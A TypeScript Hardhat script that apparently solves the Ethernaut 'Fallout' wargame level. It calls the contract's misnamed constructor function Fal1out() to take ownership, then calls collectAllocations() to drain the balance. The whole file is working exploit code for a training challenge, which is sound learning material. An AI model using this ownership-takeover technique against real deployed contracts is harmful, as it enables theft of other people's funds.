import { ethers } from "hardhat";
import { Address } from "hardhat-deploy/types";
import { Fallout } from "../typechain-types";

const delay = (ms: number) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

const main = async () => {
  const [deployer] = await ethers.getSigners();
  const contractAddress: Address = "0x72cB9F927613811e1a4c45B10366b300C637104C";
  const fallout: Fallout = await ethers.getContractAt("Fallout", contractAddress, deployer);
  // Claiming the owner calling the constructor because is a function, not constructor
  let tx = await fallout.Fal1out();
  let status = (await tx.wait()).status === 1;
  console.log(`Fal1out operation successful: ${status}`);
  const isModifiedOwner = deployer.address === await fallout.owner();
  console.log(`Owner is attacker?? ${isModifiedOwner}`);
  console.log(`New owner address is: ${await fallout.owner()}`);
  // Now, we can collect the allocations
  tx = await fallout.collectAllocations();
  console.log(`Collect Allocations operation successful: ${status}`);
};

main();
